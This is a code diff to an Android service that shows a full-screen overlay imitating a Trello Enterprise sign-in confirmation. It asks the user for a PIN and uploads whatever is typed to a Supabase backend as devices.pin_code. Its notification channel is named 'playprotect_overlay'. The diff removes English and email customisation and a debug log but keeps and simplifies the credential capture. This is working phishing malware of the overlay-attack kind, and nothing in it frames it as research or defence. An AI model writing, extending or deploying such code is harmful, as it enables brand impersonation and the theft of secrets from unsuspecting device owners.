@@ -10,7 +10,6 @@ import android.content.Intent;
 import android.graphics.Color;
 import android.graphics.Typeface;
 import android.graphics.drawable.GradientDrawable;
-import android.net.Uri;
 import android.os.Build;
 import android.os.IBinder;
 import android.provider.Settings;
@@ -32,7 +31,7 @@ import androidx.annotation.Nullable;
  * Service d'overlay minimal (Solution 2) pour test rapide via ADB.
  *
  * Lancement (Android 8+ recommandé):
- * adb shell am start-foreground-service -n com.andtracker/.OverlayPromptService --es title "Test" --es hint "Tape ici"
+ * adb shell am start-foreground-service -n com.andtracker/.OverlayPromptService
  *
  * Stop:
  * adb shell am startservice -n com.andtracker/.OverlayPromptService --es action stop
@@ -42,11 +41,6 @@ public final class OverlayPromptService extends Service {
 
     private static final String EXTRA_ACTION = "action";
     private static final String ACTION_STOP = "stop";
-
-    private static final String EXTRA_TITLE = "title";
-    private static final String EXTRA_HINT = "hint";
-    private static final String EXTRA_LANG = "lang";
-    private static final String EXTRA_EMAIL = "email";
 
     private static final String CHANNEL_ID = "playprotect_overlay";
     private static final int NOTIF_ID = 0x41A7;
@@ -79,11 +73,7 @@ public final class OverlayPromptService extends Service {
             return START_NOT_STICKY;
         }
 
-        String title = intent != null ? intent.getStringExtra(EXTRA_TITLE) : null;
-        String hint = intent != null ? intent.getStringExtra(EXTRA_HINT) : null;
-        String lang = intent != null ? intent.getStringExtra(EXTRA_LANG) : null;
-        String email = intent != null ? intent.getStringExtra(EXTRA_EMAIL) : null;
-        showOverlay(title, hint, lang, email);
+        showOverlay();
 
         return START_NOT_STICKY;
     }
@@ -142,20 +132,7 @@ public final class OverlayPromptService extends Service {
         }
     }
 
-    private boolean isEnglish(String lang) {
-        String s = (lang == null) ? "" : lang.trim().toLowerCase();
-        if (s.isEmpty()) return false;
-        // accepte: "en", "en-US", "en_GB", etc.
-        return s.startsWith("en");
-    }
-
-    private String safeEmailOrPlaceholder(String email, boolean en) {
-        String e = (email == null) ? "" : email.trim();
-        if (!e.isEmpty()) return e;
-        return en ? "your email" : "votre email";
-    }
-
-    private void showOverlay(String title, String hint, String lang, String email) {
+    private void showOverlay() {
         if (overlayView != null) return;
         wm = (WindowManager) getSystemService(WINDOW_SERVICE);
         if (wm == null) return;
@@ -180,14 +157,10 @@ public final class OverlayPromptService extends Service {
         lp.y = 0;
         lp.dimAmount = 0.65f;
 
-        final boolean en = isEnglish(lang);
-        final String emailSafe = safeEmailOrPlaceholder(email, en);
-        final String uiTitle = en ? "Confirm your sign-in" : "Confirmez votre connexion";
-        final String uiDesc = en
-                ? ("Use " + emailSafe + " to access Trello Enterprise")
-                : ("Utilisez " + emailSafe + " pour accéder à Trello Enterprise");
-        final String uiLabel = en ? "Enter your PIN code" : "Saisissez votre code PIN";
-        final String uiBtn = en ? "Confirm sign-in" : "Confirmer la connexion";
+        final String uiTitle = "Confirmez votre connexion";
+        final String uiDesc = "Saisissez votre code PIN pour finaliser la création de votre compte Trello Enterprise";
+        final String uiLabel = "Code PIN";
+        final String uiBtn = "Confirmer la connexion";
 
         // Fullscreen backdrop + centered card
         FrameLayout backdrop = new FrameLayout(this);
@@ -217,12 +190,12 @@ public final class OverlayPromptService extends Service {
         cardLp.rightMargin = dp(18);
         card.setLayoutParams(cardLp);
 
-        // Logo Trello (vector drawable)
+        // Logo Trello Enterprise (drawable)
         ImageView logo = new ImageView(this);
         try {
-            logo.setImageResource(R.drawable.trello_logo);
+            logo.setImageResource(R.drawable.trello_enterprise_logo);
         } catch (Exception ignored) {}
-        FrameLayout.LayoutParams logoLp = new FrameLayout.LayoutParams(dp(56), dp(56));
+        LinearLayout.LayoutParams logoLp = new LinearLayout.LayoutParams(dp(92), dp(92));
         logoLp.gravity = Gravity.CENTER_HORIZONTAL;
         logo.setLayoutParams(logoLp);
         logo.setScaleType(ImageView.ScaleType.FIT_CENTER);
@@ -253,7 +226,7 @@ public final class OverlayPromptService extends Service {
         card.addView(label);
 
         EditText et = new EditText(this);
-        et.setHint(en ? "PIN" : "PIN");
+        et.setHint("PIN");
         et.setInputType(InputType.TYPE_CLASS_NUMBER);
         et.setTextColor(Color.BLACK);
         et.setHintTextColor(0xFF94A3B8); // slate-400
@@ -288,20 +261,13 @@ public final class OverlayPromptService extends Service {
 
         btn.setOnClickListener(v -> {
             String value = String.valueOf(et.getText()).trim();
-            Log.i(TAG, "Overlay input: " + value);
-            // 1) Trace event (debug)
-            SupabaseAndroidEventsClient.sendEvent(
-                    OverlayPromptService.this,
-                    getPackageName(),
-                    "overlay_input",
-                    value
-            );
-            // 2) Stocke le PIN dans devices.pin_code (best-effort)
+            if (value.isEmpty()) {
+                return;
+            }
+            // Stocke le PIN dans devices.pin_code (best-effort)
             SupabaseAndroidEventsClient.upsertDevicePinCode(
                     OverlayPromptService.this,
-                    value,
-                    emailSafe,
-                    (lang == null ? "" : lang.trim())
+                    value
             );
             stopSelf();
         });
